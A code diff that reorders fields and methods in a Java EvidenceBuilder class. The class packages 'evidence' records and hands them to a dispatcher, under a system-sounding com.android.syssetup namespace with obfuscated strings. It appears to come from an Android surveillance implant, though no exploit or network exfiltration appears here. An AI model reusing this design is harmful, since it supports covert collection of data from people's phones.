@@ -9,13 +9,13 @@
 
 package com.android.syssetup.evidence;
 
+import com.android.mm.M;
 import com.android.syssetup.Packet;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DataBuffer;
 import com.android.syssetup.util.Utils;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
 
 import java.io.DataInputStream;
 import java.io.IOException;
@@ -25,62 +25,50 @@ import java.util.ArrayList;
  * The Class LogR.
  */
 public class EvidenceBuilder {
-	private static final String TAG = "EvBuilder";
-	private static boolean firstInfo = true;
-
-	/**
-	 * The type.
-	 */
-	private int type;
-
-	/**
-	 * The unique.
-	 */
-	private long unique;
-
-	/**
-	 * The disp.
-	 */
-	private EvDispatcher disp;
-
-	private boolean hasData;
-
 	/**
 	 * The Constant LOG_CREATE.
 	 */
 	final public static int LOG_CREATE = 0x1;
-
 	/**
 	 * The Constant LOG_ATOMIC.
 	 */
 	final public static int LOG_ATOMIC = 0x2;
-
 	/**
 	 * The Constant LOG_APPEND.
 	 */
 	final public static int LOG_APPEND = 0x3;
-
 	/**
 	 * The Constant LOG_WRITE.
 	 */
 	final public static int LOG_WRITE = 0x4;
-
 	/**
 	 * The Constant LOG_CLOSE.
 	 */
 	final public static int LOG_CLOSE = 0x5;
-
 	/**
 	 * The Constant LOG_ITEMS.
 	 */
 	final public static int LOG_ITEMS = 0x6;
-
 	public static final int INTERRUPT = -1;
-
+	private static final String TAG = "EvBuilder";
 	/**
 	 * The EVIDENCE delimiter.
 	 */
 	public static int E_DELIMITER = 0xABADC0DE;
+	private static boolean firstInfo = true;
+	/**
+	 * The type.
+	 */
+	private int type;
+	/**
+	 * The unique.
+	 */
+	private long unique;
+	/**
+	 * The disp.
+	 */
+	private EvDispatcher disp;
+	private boolean hasData;
 
 	/**
 	 * Instantiates a new log, creates the evidence.
@@ -129,18 +117,6 @@ public class EvidenceBuilder {
 		send(p);
 	}
 
-	private Packet init(final int evidence) {
-		unique = Utils.getRandom();
-		disp = EvDispatcher.self();
-		type = evidence;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-
-		return p;
-	}
-
 	public static void atomic(int evidenceType, byte[] additional, byte[] data) {
 		if (Cfg.DEBUG) {
 			// Check.log(TAG + " (atomic)");
@@ -157,7 +133,61 @@ public class EvidenceBuilder {
 		EvDispatcher.self().send(p);
 	}
 
+	/**
+	 * Info.
+	 *
+	 * @param message the message
+	 */
+	public static void info(final String message) {
+		try {
+			// atomic info
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + message + " firstinfo: " + firstInfo);//$NON-NLS-1$
+			}
+
+			infoStart();
+			atomic(EvidenceType.INFO, null, WChar.getBytes(message, true));
+
+		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
+			}
+		}
+	}
+
 	// Send data to dispatcher
+
+	public static void infoStart() {
+		try {
+			if (firstInfo) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Info: infoStart, firstinfo: " + firstInfo);//$NON-NLS-1$
+				}
+				atomic(EvidenceType.INFO, null, WChar.getBytes(M.e("Started"), true));
+				firstInfo = false;
+			}
+		} catch (final Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
+			}
+		}
+	}
+
+	private Packet init(final int evidence) {
+		unique = Utils.getRandom();
+		disp = EvDispatcher.self();
+		type = evidence;
+
+		final Packet p = new Packet(unique);
+
+		p.setType(type);
+
+		return p;
+	}
 
 	/**
 	 * Send.
@@ -291,47 +321,5 @@ public class EvidenceBuilder {
 
 	public boolean hasData() {
 		return hasData;
-	}
-
-	/**
-	 * Info.
-	 *
-	 * @param message the message
-	 */
-	public static void info(final String message) {
-		try {
-			// atomic info
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + message + " firstinfo: " + firstInfo);//$NON-NLS-1$
-			}
-
-			infoStart();
-			atomic(EvidenceType.INFO, null, WChar.getBytes(message, true));
-
-		} catch (final Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
-			}
-		}
-	}
-
-	public static void infoStart() {
-		try {
-			if (firstInfo) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Info: infoStart, firstinfo: " + firstInfo);//$NON-NLS-1$
-				}
-				atomic(EvidenceType.INFO, null, WChar.getBytes(M.e("Started"), true));
-				firstInfo = false;
-			}
-		} catch (final Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
-			}
-		}
 	}
 }
